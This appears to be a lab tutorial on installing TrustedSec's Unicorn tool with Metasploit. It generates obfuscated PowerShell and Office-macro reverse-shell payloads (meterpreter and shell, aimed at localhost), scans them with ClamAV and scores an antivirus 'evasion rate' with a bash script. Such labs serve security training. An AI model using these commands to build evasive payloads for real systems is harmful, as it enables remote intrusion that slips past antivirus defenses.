Task 1: Install and Configure Unicorn Framework
Step 1.1: Clone and Setup Unicorn
Install the Unicorn framework on your Linux machine:

# Update system and install dependencies
sudo apt update && sudo apt install -y git python3 python3-pip metasploit-framework

# Clone Unicorn repository
cd /opt
sudo git clone https://github.com/trustedsec/unicorn.git
sudo chown -R $USER:$USER /opt/unicorn

# Navigate and verify installation
cd /opt/unicorn
chmod +x unicorn.py
python3 unicorn.py --help
Step 1.2: Explore Unicorn Capabilities
Review available options and payload types:

# Display help menu
python3 unicorn.py --help

# View available Metasploit payloads
msfvenom --list payloads | grep windows
Key Unicorn Features:

PowerShell attack vectors with automatic obfuscation
Macro attack vectors for Office documents
DDE (Dynamic Data Exchange) attack vectors
Multiple encoding and obfuscation layers
Step 1.3: Generate Basic Payloads
Create your first obfuscated payloads:

# Create working directory
mkdir -p ~/unicorn_lab
cd ~/unicorn_lab

# Generate basic reverse TCP payload
python3 /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp 127.0.0.1 4444

# Examine the generated payload
cat powershell_attack.txt | head -20

# Rename for organization
mv powershell_attack.txt payload_basic.txt
Step 1.4: Generate Multiple Payload Variants
Create different payload types for testing:

# Generate reverse HTTPS payload
python3 /opt/unicorn/unicorn.py windows/meterpreter/reverse_https 127.0.0.1 443
mv powershell_attack.txt payload_https.txt

# Generate shell payload
python3 /opt/unicorn/unicorn.py windows/shell/reverse_tcp 127.0.0.1 4445
mv powershell_attack.txt payload_shell.txt

# Generate macro-based payload
python3 /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp 127.0.0.1 4446 macro
mv powershell_attack.txt payload_macro.txt

# List all generated payloads
ls -lh payload_*.txt
Task 2: Test Payloads Against Antivirus Software
Step 2.1: Install and Configure ClamAV
Setup local antivirus testing environment:

# Install ClamAV antivirus engine
sudo apt install -y clamav clamav-daemon

# Update virus definitions
sudo systemctl stop clamav-freshclam
sudo freshclam
sudo systemctl start clamav-freshclam

# Verify ClamAV is working
clamscan --version
Step 2.2: Create Baseline Test
Verify antivirus detection capabilities:

# Create EICAR test file (standard AV test)
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > eicar.txt

# Test detection (should be detected)
clamscan eicar.txt

# Expected output: eicar.txt: Win.Test.EICAR_HDB-1 FOUND
Step 2.3: Test Generated Payloads
Scan your Unicorn-generated payloads:

# Scan individual payloads
echo "=== Testing Basic Payload ==="
clamscan payload_basic.txt

echo "=== Testing HTTPS Payload ==="
clamscan payload_https.txt

echo "=== Testing Shell Payload ==="
clamscan payload_shell.txt

echo "=== Testing Macro Payload ==="
clamscan payload_macro.txt

# Scan all payloads at once
clamscan payload_*.txt --no-summary
Step 2.4: Create Detection Analysis Script
Build a simple bash script to analyze results:

cat > detection_test.sh << 'EOF'
#!/bin/bash

echo "=== Antivirus Detection Analysis ==="
echo "Date: $(date)"
echo "===================================="

TOTAL=0
DETECTED=0

for payload in payload_*.txt; do
    if [ -f "$payload" ]; then
        TOTAL=$((TOTAL + 1))
        echo -n "Testing $payload: "
        
        if clamscan --no-summary "$payload" 2>/dev/null | grep -q "FOUND"; then
            echo "DETECTED"
            DETECTED=$((DETECTED + 1))
        else
            echo "NOT DETECTED"
        fi
    fi
done

EVASION_RATE=$(( (TOTAL - DETECTED) * 100 / TOTAL ))

echo "===================================="
echo "Total Payloads: $TOTAL"
echo "Detected: $DETECTED"
echo "Evaded: $((TOTAL - DETECTED))"
echo "Evasion Rate: ${EVASION_RATE}%"
EOF

chmod +x detection_test.sh
./detection_test.sh
